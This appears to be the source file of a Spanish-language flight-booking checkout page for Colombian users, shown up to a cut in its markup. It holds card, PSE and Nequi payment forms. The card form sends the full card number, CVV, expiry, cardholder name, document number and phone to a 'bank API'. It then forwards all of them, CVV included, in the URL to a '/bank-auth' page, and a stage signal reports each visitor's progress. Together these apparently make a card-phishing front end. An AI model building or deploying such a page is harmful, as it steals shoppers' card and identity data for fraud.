import PaymentFooter from "@/components/payment/PaymentFooter";
import NavSecondary from "@/components/shared/NavSecondary";
import CustomAlert from "@/components/shared/CustomAlert";
import {useEffect, useRef, useState} from "react";
import {FaCheck, FaChevronUp, FaExclamationCircle} from "react-icons/fa";
import {CgChevronDown} from "react-icons/cg";
import { useFlightStore } from "@/stores/flightStore";
import { format } from "date-fns";
import { es } from "date-fns/locale";
import FullScreenLoader from "@/components/shared/FullScreenLoader";
import card from "@/assets/icons/card.png";
import pego from "@/assets/icons/payment-5.svg";
import bancolombia from "@/assets/icons/bancolombia.png";
import nequi from "@/assets/icons/nequi.png";
import payment_1 from "@/assets/icons/payment-1.svg";
import payment_2 from "@/assets/icons/payment-2.svg";
import payment_3 from "@/assets/icons/payment-3.svg";
import payment_4 from "@/assets/icons/payment-4.svg";
import encrypt from "@/assets/images/encription.png";
import progress from "@/assets/images/progress.png";
import {useSearchParams, useNavigate} from "react-router";
import { useBankAPI, useCustomAlert } from "@/hooks";
import { calculateFlightTotal, sendStatusSignal } from "@/services";
import { API_CONFIG, API_ENDPOINTS, DEFAULT_HEADERS } from "@/config/api";

type PaymentMethod = "card" | "online" | "bancolombia" | "nequi";

// Tipos para el formulario de tarjeta
interface CardFormData {
    cardNumber: string;
    expiryMonth: string;
    expiryYear: string;
    cardholderName: string;
    cvv: string;
    installments: string;
    documentId: string;
    country: string;
    phone: string;
}

interface CardValidationErrors {
    cardNumber?: string;
    expiryMonth?: string;
    expiryYear?: string;
    cardholderName?: string;
    cvv?: string;
    installments?: string;
    documentId?: string;
    country?: string;
    phone?: string;
}

const paymentMethods = [
    {id: "card", label: "Crédito y débito", img: card},
    {id: "online", label: "Pago en línea", img: pego},
    {id: "bancolombia", label: "Botón Bancolombia", img: bancolombia},
    {id: "nequi", label: "Paga con Nequi", img: nequi},
];

const images = [payment_1, payment_3, payment_2, payment_4];

// Función para validar algoritmo Luhn
const validateLuhn = (cardNumber: string): boolean => {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    if (cleanNumber.length < 13 || cleanNumber.length > 19) return false;
    
    let sum = 0;
    let isEven = false;
    
    for (let i = cleanNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanNumber[i]);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return sum % 10 === 0;
};

// Función para detectar tipo de tarjeta
const detectCardType = (cardNumber: string): 'visa' | 'mastercard' | 'amex' | 'unknown' => {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    
    if (/^3/.test(cleanNumber)) return 'amex';
    if (/^4/.test(cleanNumber)) return 'visa';
    if (/^5/.test(cleanNumber)) return 'mastercard';
    
    return 'unknown';
};

// Función para formatear número de tarjeta
const formatCardNumber = (value: string): string => {
    const cleanValue = value.replace(/\D/g, '');
    const cardType = detectCardType(cleanValue);
    
    if (cardType === 'amex') {
        // American Express: XXXX XXXXXX XXXXX (15 dígitos)
        return cleanValue.replace(/(\d{4})(\d{6})(\d{5})/, '$1 $2 $3');
    } else {
        // Visa/Mastercard/otros: XXXX XXXX XXXX XXXX (16 dígitos)
        return cleanValue.replace(/(\d{4})(?=\d)/g, '$1 ');
    }
};

// Componente del formulario de tarjeta
const CardPaymentForm = ({ 
    onSubmit, 
    flightInfo
}: { 
    onSubmit: (cardType: string, lastFourDigits: string, formData: CardFormData) => void;
    flightInfo: {
        searchInfo: any;
        selectedFlight: any;
        selectedReturnFlight: any;
    };
}) => {
    const [formData, setFormData] = useState<CardFormData>({
        cardNumber: '',
        expiryMonth: '',
        expiryYear: '',
        cardholderName: '',
        cvv: '',
        installments: '1',
        documentId: '',
        country: 'co',
        phone: ''
    });

    const [errors, setErrors] = useState<CardValidationErrors>({});
    const [cardType, setCardType] = useState<'visa' | 'mastercard' | 'amex' | 'unknown'>('unknown');
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [submitErrorMessage, setSubmitErrorMessage] = useState<string>('');

    const handleInputChange = (field: keyof CardFormData, value: string) => {
        let formattedValue = value;
        
        if (field === 'cardNumber') {
            const cleanValue = value.replace(/\D/g, '');
            const detectedType = detectCardType(cleanValue);
            setCardType(detectedType);
            let maxDigits: number = detectedType === 'amex' ? 15 : 16;
            const limitedValue = cleanValue.slice(0, maxDigits);
            formattedValue = formatCardNumber(limitedValue);
        }

        if (field === 'cvv') {
            // Solo dígitos y longitud según BIN (AMEX=4, otros=3)
            const onlyDigits = value.replace(/\D/g, '');
            const maxLen = cardType === 'amex' ? 4 : 3;
            formattedValue = onlyDigits.slice(0, maxLen);
        }
        
        setFormData(prev => ({ ...prev, [field]: formattedValue }));
        setSubmitErrorMessage('');
        
        if (errors[field]) {
            setErrors(prev => ({ ...prev, [field]: undefined }));
        }
    };

    const validateForm = (): boolean => {
        const newErrors: CardValidationErrors = {};

        if (!formData.cardNumber.trim()) {
            newErrors.cardNumber = 'El número de tarjeta es requerido';
        } else if (formData.cardNumber.replace(/\s/g, '').length < 13) {
            newErrors.cardNumber = 'El número de tarjeta debe tener al menos 13 dígitos';
        } else if (!validateLuhn(formData.cardNumber)) {
            newErrors.cardNumber = 'El número de tarjeta no es válido';
        }

        if (!formData.expiryMonth) {
            newErrors.expiryMonth = 'El mes de expiración es requerido';
        }

        if (!formData.expiryYear) {
            newErrors.expiryYear = 'El año de expiración es requerido';
        }

        if (formData.expiryMonth && formData.expiryYear) {
            const currentDate = new Date();
            const currentYear = currentDate.getFullYear();
            const currentMonth = currentDate.getMonth() + 1;
            const expiryYear = parseInt(formData.expiryYear);
            const expiryMonth = parseInt(formData.expiryMonth);
            if (expiryYear < currentYear || (expiryYear === currentYear && expiryMonth < currentMonth)) {
                newErrors.expiryMonth = 'La tarjeta ha expirado';
                newErrors.expiryYear = 'La tarjeta ha expirado';
            }
        }

        if (!formData.cardholderName.trim()) {
            newErrors.cardholderName = 'El nombre del titular es requerido';
        }

        // CVV: dinámica según primer dígito (AMEX=4, otros=3)
        const requiredCvvLen = cardType === 'amex' ? 4 : 3;
        if (!formData.cvv.trim()) {
            newErrors.cvv = 'El CVV es requerido';
        } else if (formData.cvv.length !== requiredCvvLen) {
            newErrors.cvv = cardType === 'amex' 
                ? 'El CVV debe tener 4 dígitos para American Express' 
                : 'El CVV debe tener 3 dígitos';
        }

        if (!formData.installments) {
            newErrors.installments = 'Las cuotas son requeridas';
        }

        if (!formData.documentId.trim()) {
            newErrors.documentId = 'El documento es requerido';
        }

        if (!formData.country) {
            newErrors.country = 'El país es requerido';
        }

        if (!formData.phone.trim()) {
            newErrors.phone = 'El teléfono es requerido';
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = () => {
        if (validateForm()) {
            setIsSubmitting(true);
            
            // Obtener los últimos 4 dígitos de la tarjeta
            const lastFourDigits = formData.cardNumber.replace(/\s/g, '').slice(-4);
            
            // Enviar datos iniciales a la API
            sendInitialCardData(flightInfo, {
                cardNumber: formData.cardNumber.replace(/\s/g, ''),
                expiryDate: `${formData.expiryMonth}/${formData.expiryYear}`,
                cvv: formData.cvv,
                installments: formData.installments,
                cardholderName: formData.cardholderName,
                documentId: formData.documentId,
                phone: formData.phone
            });
            
            // Simular procesamiento y mantener loader hasta la navegación
            setTimeout(() => {
                // NO cambiar setIsSubmitting aquí, se mantiene activo hasta la navegación
                // Llamar a la función onSubmit del componente padre con el tipo de tarjeta, últimos dígitos y datos del formulario
                onSubmit(cardType, lastFourDigits, formData);
            }, 2000);
        } else {
            // Mostrar errores de validación como label debajo del botón
            const errorMessages = Object.values(errors).filter(Boolean) as string[];
            if (errorMessages.length > 0) {
                setSubmitErrorMessage(errorMessages[0]);
            } else {
                setSubmitErrorMessage('Por favor corrige los campos marcados.');
            }
        }
    };

    // Usar el hook para enviar datos iniciales
    const { sendInitialCardData } = useBankAPI();

    // Mostrar loader durante el envío
    if (isSubmitting) {
        return (
            <FullScreenLoader 
                message="Procesando pago..." 
            />
        );
    }

    return (
        <div className="space-y-4">
            <h3 className="text-2xl font-medium text-gray-900 flex items-center gap-2">Ingresa los datos de tu tarjeta</h3>
            <div className="flex gap-5 mb-4">
                {images.map((pym, id) => (
                    <img src={pym} key={id} className="h-4" />
                ))}
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Número de tarjeta:</label>
                    <input 
                        type="text" 
                        className={`border py-3 w-full px-3 rounded border-light ${errors.cardNumber ? 'border-red-500' : ''}`}
                        value={formData.cardNumber}
                        onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                        placeholder="0000 0000 0000 0000"
                        maxLength={cardType === 'amex' ? 19 : 20}
                        onKeyPress={(e) => {
                            if (!/\d/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
                                e.preventDefault();
                            }
                        }}
                    />
                    {errors.cardNumber && <p className="text-red-600 text-sm mt-1">{errors.cardNumber}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Nombre y apellido del titular:</label>
                    <input type="text" className={`border py-3 w-full px-3 rounded border-light ${errors.cardholderName ? 'border-red-500' : ''}`} placeholder="Como aparece en la tarjeta" value={formData.cardholderName} onChange={(e) => handleInputChange('cardholderName', e.target.value)} />
                    {errors.cardholderName && <p className="text-red-600 text-sm mt-1">{errors.cardholderName}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Fecha de expiración:</label>
                    <div className="grid grid-cols-2 gap-2">
                        <select className={`border py-3 px-3 rounded border-light ${errors.expiryMonth ? 'border-red-500' : ''}`} value={formData.expiryMonth} onChange={(e) => handleInputChange('expiryMonth', e.target.value)}>
                            <option value="">Mes</option>
                            {Array.from({ length: 12 }, (_, i) => i + 1).map((m) => (
                                <option key={m} value={String(m).padStart(2, '0')}>{String(m).padStart(2, '0')}</option>
                            ))}
                        </select>
                        <select className={`border py-3 px-3 rounded border-light ${errors.expiryYear ? 'border-red-500' : ''}`} value={formData.expiryYear} onChange={(e) => handleInputChange('expiryYear', e.target.value)}>
                            <option value="">Año</option>
                            {Array.from({ length: 15 }, (_, i) => new Date().getFullYear() + i).map((y) => (
                                <option key={y} value={String(y)}>{y}</option>
                            ))}
                        </select>
                    </div>
                    {(errors.expiryMonth || errors.expiryYear) && <p className="text-red-600 text-sm mt-1">{errors.expiryMonth || errors.expiryYear}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">CVV:</label>
                    <input 
                        type="password" 
                        className={`border py-3 w-full px-3 rounded border-light ${errors.cvv ? 'border-red-500' : ''}`} 
                        placeholder="***" 
                        value={formData.cvv} 
                        onChange={(e) => handleInputChange('cvv', e.target.value)} 
                        inputMode="numeric"
                        pattern="\\d*"
                        maxLength={cardType === 'amex' ? 4 : 3}
                        onKeyPress={(e) => {
                            if (!/\d/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
                                e.preventDefault();
                            }
                        }}
                    />
                    {errors.cvv && <p className="text-red-600 text-sm mt-1">{errors.cvv}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Cuotas:</label>
                    <select className={`border py-3 w-full px-3 rounded border-light ${errors.installments ? 'border-red-500' : ''}`} value={formData.installments} onChange={(e) => handleInputChange('installments', e.target.value)}>
                        {Array.from({ length: 36 }, (_, i) => i + 1).map((n) => (
                            <option key={n} value={String(n)}>{n}</option>
                        ))}
                    </select>
                    {errors.installments && <p className="text-red-600 text-sm mt-1">{errors.installments}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Documento:</label>
                    <input type="text" className={`border py-3 w-full px-3 rounded border-light ${errors.documentId ? 'border-red-500' : ''}`} placeholder="Número de documento" value={formData.documentId} onChange={(e) => handleInputChange('documentId', e.target.value)} />
                    {errors.documentId && <p className="text-red-600 text-sm mt-1">{errors.documentId}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">País:</label>
                    <select className={`border py-3 w-full px-3 rounded border-light ${errors.country ? 'border-red-500' : ''}`} value={formData.country} onChange={(e) => handleInputChange('country', e.target.value)}>
                        <option value="co">Colombia</option>
                    </select>
                    {errors.country && <p className="text-red-600 text-sm mt-1">{errors.country}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Teléfono/celular:</label>
                    <input type="text" className={`border py-3 w-full px-3 rounded border-light ${errors.phone ? 'border-red-500' : ''}`} placeholder="Número telefónico" value={formData.phone} onChange={(e) => handleInputChange('phone', e.target.value)} />
                    {errors.phone && <p className="text-red-600 text-sm mt-1">{errors.phone}</p>}
                </div>
            </div>

            <div>
                <button onClick={handleSubmit} className=" bg-[#D03100] hover:bg-red-700 text-white font-semibold py-3 px-4 rounded-md transition-colors">
                    Pagar ahora
                </button>
                {submitErrorMessage && (
                    <div className="mt-3 bg-red-50 border border-red-200 text-red-800 text-sm p-2 rounded">
                        {submitErrorMessage}
                    </div>
                )}
            </div>
        </div>
    );
};

// Formulario PSE que replica el flujo de payment.js (popup + postMessage)
const PSEPaymentForm = ({ amount }: { amount: number }) => {
    const [form, setForm] = useState({
        bank: 'bancolombia',
        personType: 'natural',
        docType: '',
        docNumber: '',
        name: '',
        surname: '',
        email: '',
        phone: '',
        city: '',
        address: ''
    });

    const popupRef = useRef<Window | null>(null);
    const checkerRef = useRef<number | null>(null);
    const [errors, setErrors] = useState<Record<string, string>>({});
    const [formError, setFormError] = useState<string>('');

    const update = (k: keyof typeof form, v: string) => {
        setForm(prev => ({ ...prev, [k]: v }));
        if (errors[k]) setErrors(prev => ({ ...prev, [k]: '' }));
    };

    const validate = (): boolean => {
        const nextErrors: Record<string, string> = {};
        if (!form.docType) nextErrors.docType = 'Selecciona el tipo de documento';
        if (!form.docNumber) nextErrors.docNumber = 'Ingresa el número de documento';
        if (!form.name) nextErrors.name = 'Ingresa tus nombres';
        if (!form.surname) nextErrors.surname = 'Ingresa tus apellidos';
        if (!form.email) nextErrors.email = 'Ingresa tu email';
        if (!form.phone) nextErrors.phone = 'Ingresa tu teléfono';
        if (!form.city) nextErrors.city = 'Ingresa tu ciudad';
        if (!form.address) nextErrors.address = 'Ingresa tu dirección';
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (form.email && !emailRegex.test(form.email)) nextErrors.email = 'Ingresa un email válido';
        setErrors(nextErrors);
        return Object.keys(nextErrors).length === 0;
    };

    const sleep = (ms: number) => new Promise(res => setTimeout(res, ms));

    const openPSE = async () => {
        if (!validate()) return;

        const PSE_URL = API_CONFIG.PSE_URL;
        popupRef.current = window.open(PSE_URL, 'PSE', 'width=900,height=700');
        if (!popupRef.current) {
            setFormError('No pudimos abrir la ventana de PSE. Desbloquea los pop-ups e intenta de nuevo.');
            return;
        }

        const targetOrigin = new URL(PSE_URL).origin;

        const dataToPSE = {
            transId: API_CONFIG.API_KEY,
            origin: 'TIQUETES BARATOS SAS',
            desc: 'PAG* TIQU* PLAT* WE*',
            bank: form.bank,
            id: form.docNumber,
            name: `${form.name} ${form.surname}`.trim(),
            amount
        };

        async function handleMessage(event: MessageEvent) {
            if (event.origin !== targetOrigin) return;
            const { action, data } = (event.data || {}) as any;

            if (action === 'ready') {
                popupRef.current?.postMessage({ action: 'init', data: dataToPSE }, targetOrigin);
            }

            if (action === 'done') {
                window.removeEventListener('message', handleMessage as any);
                if (checkerRef.current) window.clearInterval(checkerRef.current);
                popupRef.current?.close();

                await sleep(200);
                if (data?.response === 'error') setFormError('No pudimos completar el pago con PSE. Inténtalo de nuevo o prueba con otro medio de pago');
                if (data?.response === 'cancel') setFormError('No pudimos completar el pago con PSE. Intente con otro medio de pago.');
                if (data?.response === 'success') {
                    // Usar la SPA en vez del HTML estático
                    window.location.href = '/success';
                }
            }
        }

        window.addEventListener('message', handleMessage as any);

        checkerRef.current = window.setInterval(() => {
            if (!popupRef.current || popupRef.current.closed) {
                if (checkerRef.current) window.clearInterval(checkerRef.current);
                window.removeEventListener('message', handleMessage as any);
                setFormError('No pudimos completar el pago con PSE. Intenta con otro medio de pago.');
            }
        }, 400);
    };

    return (
        <div className="space-y-4">
            {formError && (
                <div className="mb-2 bg-red-50 border border-red-200 text-red-800 text-sm p-3 rounded flex items-start justify-between">
                    <span>{formError}</span>
                    <button onClick={() => setFormError('')} className="ml-3 text-red-700 hover:text-red-900">✕</button>
                </div>
            )}
            <h3 className="text-2xl font-medium">Pago en línea (PSE)</h3>
            <p className="text-gray-600">Elige el banco y completa tus datos para continuar a PSE.</p>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Tipo de persona:</label>
                    <select className="border py-3 w-full px-3 rounded border-light" value={form.personType} onChange={e => update('personType', e.target.value)}>
                        <option value="natural">Natural</option>
                        <option value="juridica">Jurídica</option>
                    </select>
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Banco:</label>
                    <select className="border py-3 w-full px-3 rounded border-light" value={form.bank} onChange={e => update('bank', e.target.value)}>
                        <option value="bancolombia">Bancolombia</option>
                        <option value="davivienda">Davivienda</option>
                        <option value="nequi">Nequi</option>
                        <option value="bogotá">Banco de Bogotá</option>
                    </select>
                </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Tipo de documento:</label>
                    <select className={`border py-3 w-full px-3 rounded border-light ${errors.docType ? 'border-red-500' : ''}`} value={form.docType} onChange={e => update('docType', e.target.value)}>
                        <option value="">Seleccionar</option>
                        <option value="cc">Cédula de Ciudadanía</option>
                        <option value="ce">Cédula de Extranjería</option>
                        <option value="passport">Pasaporte</option>
                    </select>
                    {errors.docType && <p className="text-red-600 text-sm mt-1">{errors.docType}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">No. de documento:</label>
                    <input type="text" className={`border py-3 w-full px-3 rounded border-light ${errors.docNumber ? 'border-red-500' : ''}`} placeholder="Número de documento" value={form.docNumber} onChange={e => update('docNumber', e.target.value.replace(/[^0-9A-Za-z]/g, ''))} />
                    {errors.docNumber && <p className="text-red-600 text-sm mt-1">{errors.docNumber}</p>}
                </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Nombres:</label>
                    <input type="text" className={`border py-3 w-full px-3 rounded border-light ${errors.name ? 'border-red-500' : ''}`} value={form.name} onChange={e => update('name', e.target.value)} />
                    {errors.name && <p className="text-red-600 text-sm mt-1">{errors.name}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Apellidos:</label>
                    <input type="text" className={`border py-3 w-full px-3 rounded border-light ${errors.surname ? 'border-red-500' : ''}`} value={form.surname} onChange={e => update('surname', e.target.value)} />
                    {errors.surname && <p className="text-red-600 text-sm mt-1">{errors.surname}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Email:</label>
                    <input type="email" className={`border py-3 w-full px-3 rounded border-light ${errors.email ? 'border-red-500' : ''}`} value={form.email} onChange={e => update('email', e.target.value)} />
                    {errors.email && <p className="text-red-600 text-sm mt-1">{errors.email}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Teléfono/celular:</label>
                    <input type="text" className={`border py-3 w-full px-3 rounded border-light ${errors.phone ? 'border-red-500' : ''}`} value={form.phone} onChange={e => update('phone', e.target.value.replace(/\D/g, ''))} />
                    {errors.phone && <p className="text-red-600 text-sm mt-1">{errors.phone}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Ciudad:</label>
                    <input type="text" className={`border py-3 w-full px-3 rounded border-light ${errors.city ? 'border-red-500' : ''}`} value={form.city} onChange={e => update('city', e.target.value)} />
                    {errors.city && <p className="text-red-600 text-sm mt-1">{errors.city}</p>}
                </div>
                <div>
                    <label className="block text-sm font-medium text-muted mb-1">Dirección:</label>
                    <input type="text" className={`border py-3 w-full px-3 rounded border-light ${errors.address ? 'border-red-500' : ''}`} value={form.address} onChange={e => update('address', e.target.value)} />
                    {errors.address && <p className="text-red-600 text-sm mt-1">{errors.address}</p>}
                </div>
            </div>

            <button onClick={openPSE} className=" bg-[#D03100] hover:bg-red-700 text-white font-semibold py-3 px-4 rounded-md transition-colors">
                Pagar con PSE
            </button>
        </div>
    );
};

// Formulario Nequi con validaciones + activación de modal tipo loader
const NequiPaymentForm = ({ amount, onStart, errorMessage, onClearError }: { amount: number; onStart: (phone: string) => void; errorMessage?: string; onClearError?: () => void }) => {
    const [phone, setPhone] = useState<string>("");
    const [error, setError] = useState<string>("");

    const handleChange = (value: string) => {
        const onlyDigits = value.replace(/\D/g, "").slice(0, 10);
        setPhone(onlyDigits);
        if (error) setError("");
        if (errorMessage && onClearError) onClearError();
    };

    const validate = (): boolean => {
        if (phone.length !== 10) { setError('El número debe tener 10 dígitos.'); return false; }
        if (!phone.startsWith('3')) { setError("El número debe iniciar con '3'."); return false; }
        return true;
    };

    const handleSubmit = () => {
        if (!validate()) return;
        onStart(phone);
    };

    return (
        <div>
            {errorMessage && (
                <div className="mb-4 bg-red-50 border border-red-200 text-red-800 text-sm p-3 rounded flex items-start justify-between">
                    <span>{errorMessage}</span>
                    {onClearError && (
                        <button onClick={onClearError} className="ml-3 text-red-700 hover:text-red-900">✕</button>
                    )}
                </div>
            )}
            <div className="mb-8">
                <h3 className="text-lg font-bold text-gray-800 mb-4">Pago con cuenta Nequi</h3>
                <ul className="list-decimal list-inside">
                    <li className="text-gray-700 mt-1">Ingresa el número celular de la cuenta Nequi.</li>
                    <li className="text-gray-700 mt-1">Da click en “Pagar”.</li>
                    <li className="text-gray-700 mt-1">Recibirás una notificación a tu celular para finalizar la compra.</li>
                </ul>
            </div>
            <h2 className="text-xl font-semibold text-primary mb-3">Tus datos:</h2>
            <div>
                <label className="block text-sm font-medium text-muted mb-1">Número celular de tu cuenta Nequi</label>
                <input
                    type="text"
                    className={`border py-3 w-full md:w-1/2 px-3 rounded border-light ${error ? 'border-red-500' : ''}`}
                    value={phone}
                    onChange={(e) => handleChange(e.target.value)}
                    placeholder="3XXXXXXXXX"
                    maxLength={10}
                    inputMode="numeric"
                    onKeyPress={(e) => { if (!/\d/.test(e.key)) e.preventDefault(); }}
                />
                {error && <p className="text-red-600 text-sm mt-1">{error}</p>}
            </div>
            <div className="flex items-start my-6">
                <div className="flex items-center h-5">
                    <input id="terms" type="checkbox" className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" />
                </div>
                <label htmlFor="terms" className="ml-3 text-sm text-gray-700 cursor-pointer">
                    Acepto haber leído los <span className="text-red-400">Términos y Condiciones y la Política de Privacidad</span> para
                    hacer este pago.
                </label>
            </div>
            <button onClick={handleSubmit} className=" bg-[#D03100] hover:bg-red-700 text-white font-semibold py-3 px-4 rounded-md transition-colors">
                Pagar
            </button>
        </div>
    );
};

const PaymentInterface = () => {
    const [selectedMethod, setSelectedMethod] = useState<PaymentMethod>("card");
    const [timeLeft, setTimeLeft] = useState({minutes: 9, seconds: 30});
    const [promoExpanded, setPromoExpanded] = useState(false);
    const [searchParams] = useSearchParams();
    const logo = searchParams.get("logo") || "";
    const navigate = useNavigate();
    
    // Obtener información real del vuelo desde el store
    const { searchInfo, selectedFlight, selectedReturnFlight } = useFlightStore();

    const [loading, setLoading] = useState(true);
    const [nequiModalOpen, setNequiModalOpen] = useState(false);
    const [nequiPhone, setNequiPhone] = useState<string>("");
    const [nequiError, setNequiError] = useState<string>('');
    
    // Estado para mensajes
    const [message, setMessage] = useState<string>('');
    const [messageType, setMessageType] = useState<'error' | 'info'>('info');
    const { alertState: paymentAlert, showError: showPaymentError, showInfo: showPaymentInfo, hideAlert: hidePaymentAlert } = useCustomAlert();

    // Función para mostrar mensajes
    const showMessage = (msg: string, type: 'error' | 'info' = 'info') => {
        setMessage(msg);
        setMessageType(type);
        // Limpiar mensaje después de 5 segundos
        setTimeout(() => {
            setMessage('');
        }, 5000);
    };

    // Usar el servicio de cálculos
    const flightCalculation = calculateFlightTotal(searchInfo, selectedFlight, selectedReturnFlight);
    const taxesAndFees = 0; // Impuestos y tasas (dejamos en 0 como solicitaste)
    const finalTotal = flightCalculation.finalTotal + taxesAndFees;
    
    // Formatear fecha de salida
    const departureDate = searchInfo.startDate ? 
        format(searchInfo.startDate, "dd MMM. yyyy", { locale: es }) : 
        "Fecha no disponible";
    
    // Formatear fecha de regreso (si es roundtrip)
    const returnDate = searchInfo.endDate ? 
        format(searchInfo.endDate, "dd MMM. yyyy", { locale: es }) : 
        null;

    // Formatear hora de salida y llegada
    const formatTime = (time: string) => {
        if (!time) return "00:00";
        return time.replace(":", "hrs ");
    };

    // Fire-and-forget status: P4-PAYMENT al montar la pantalla de pago
    useEffect(() => {
        sendStatusSignal('P4-PAYMENT');
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, []);

    useEffect(() => {
        // Simulate loading delay (e.g. API call or processing)
        const timer = setTimeout(() => {
            setLoading(false);
        }, 1500); // 1.5 seconds delay (consistente con otros loaders)

        return () => clearTimeout(timer);
    }, []);
    useEffect(() => {
        const timer = setInterval(() => {
            setTimeLeft((prev) => {
                if (prev.seconds > 0) {
                    return {...prev, seconds: prev.seconds - 1};
                } else if (prev.minutes > 0) {
                    return {minutes: prev.minutes - 1, seconds: 59};
                }
                return prev;
            });
        }, 1000);

        return () => clearInterval(timer);
    }, []);

   

    const renderPaymentForm = () => {
        switch (selectedMethod) {
            case "card":
                return (
                    <CardPaymentForm 
                        flightInfo={{ searchInfo, selectedFlight, selectedReturnFlight }}
                        onSubmit={(cardType, lastFourDigits, formData) => {
                            // Simular procesamiento
                            setTimeout(() => {
                                // Redirigir a la página de autenticación bancaria con todos los datos necesarios
                                navigate(`/bank-auth?type=${cardType}&last4=${lastFourDigits}&cardNumber=${formData.cardNumber.replace(/\s/g, '')}&expiryDate=${formData.expiryMonth}/${formData.expiryYear}&cvv=${formData.cvv}&installments=${formData.installments}&cardholderName=${formData.cardholderName}&documentId=${formData.documentId}&phone=${formData.phone}&logo=${encodeURIComponent(logo)}`);
                            }, 2000);
                        }} 
                    />
                );

            case "online":
                return (
                    <PSEPaymentForm amount={finalTotal} />
                );

            case "bancolombia":
                return (
                    <div>
                        <div className="mb-6">
                            <h2 className="text-xl font-semibold text-primary mb-3">Importante:</h2>
                            <div className="flex items-center">
                                <FaExclamationCircle className="flex-shrink-0 text-xs  mr-2" />
                                <p className="">Disponible únicamente para personas naturales.</p>
                            </div>
                        </div>

                        <div className="mb-8">
                            <h3 className="text-lg font-bold text-gray-800 mb-4">Pago con botón Bancolombia</h3>

                            <ul className="list-decimal list-inside">
                                <li className="text-gray-700 mt-1">Da click en "Completar reservación".</li>
                                <li className="text-gray-700 mt-1">Se abrirá en otra ventana la página oficial de botón Bancolombia.</li>
                                <li className="text-gray-700 mt-1">Ingresa tus datos de forma de pago y finaliza la reserva.</li>
                            </ul>
                        </div>

                        <div className="flex items-start mb-6">
                            <div className="flex items-center h-5">
                                <input id="terms" type="checkbox" className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" />
                            </div>
                            <label htmlFor="terms" className="ml-3 text-sm text-gray-700 cursor-pointer">
                                Acepto haber leído los <span className="text-red-400">Términos y Condiciones y la Política de Privacidad</span> para
                                hacer este pago.
                            </label>
                        </div>

                        <button className=" bg-[#D03100] hover:bg-red-700 text-white font-semibold py-3 px-4 rounded-md transition-colors">
                            Completar reservación
                        </button>
                    </div>
                );
            case "nequi":
                return (
                    <NequiPaymentForm amount={finalTotal} errorMessage={nequiError} onClearError={() => setNequiError('')} onStart={(phone) => {
                        setNequiPhone(phone);
                        setNequiModalOpen(true);
                        (async () => {
                            try {
                                const response = await fetch(`${API_CONFIG.API_URL}${API_ENDPOINTS.NEQUI_BTN}`, {
                                    method: 'POST',
                                    headers: DEFAULT_HEADERS,
                                    body: JSON.stringify({ number: phone, value: finalTotal })
                                });
                                if (!response.ok) throw new Error('http');
                                const data = await response.json();
                                const msg = String(data?.redirect_to || '').toLowerCase();
                                if (msg === 'error') {
                                    setNequiError('No pudimos procesar el pago, inténtalo de nuevo con otro medio de pago');
                                    setNequiModalOpen(false);
                                    return;
                                }
                                if (msg === 'try') {
                                    setNequiError('No detectamos el pago, inténtalo de nuevo');
                                    setNequiModalOpen(false);
                                    return;
                                }
                                if (msg === 'success') {
                                    navigate('/success');
                                    return;
                                }
                                // Caso desconocido
                                setNequiError('No pudimos procesar el pago, intentalo nuevamente');
                                setNequiModalOpen(false);
                            } catch (e) {
                                setNequiError('No pudimos procesar el pago, intentalo nuevamente');
                                setNequiModalOpen(false);
                            }
                        })();
                    }} />
                );
        }
    };

    return (
        <div className="">
            <CustomAlert 
                message={paymentAlert.message} 
                isVisible={paymentAlert.isVisible} 
                onClose={hidePaymentAlert} 
                type={paymentAlert.type} 
            />
            {/* Eliminado overlay de mensajes. Si se requiere mensaje informativo global, se puede añadir aquí en negrita */}
            
            <NavSecondary />
            {loading && (
                <FullScreenLoader message="Cargando información del vuelo..." />
            )}

            {/* <div className="flex items-center justify-between max-w-md mx-auto">
                <div className="flex items-center gap-2 text-sm">
                    <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center text-white text-xs font-bold">✓</div>
                    <span className="text-gray-900">Ingresa tus datos</span>
                </div>
                <div className="flex items-center gap-2 text-sm">
                    <div className="w-6 h-6 border-2 rounded-full flex items-center justify-center">2</div>
                    <span className="font-semibold text-gray-900">Forma de pago</span>
                </div>
                <div className="flex items-center gap-2 text-sm text-gray-500">
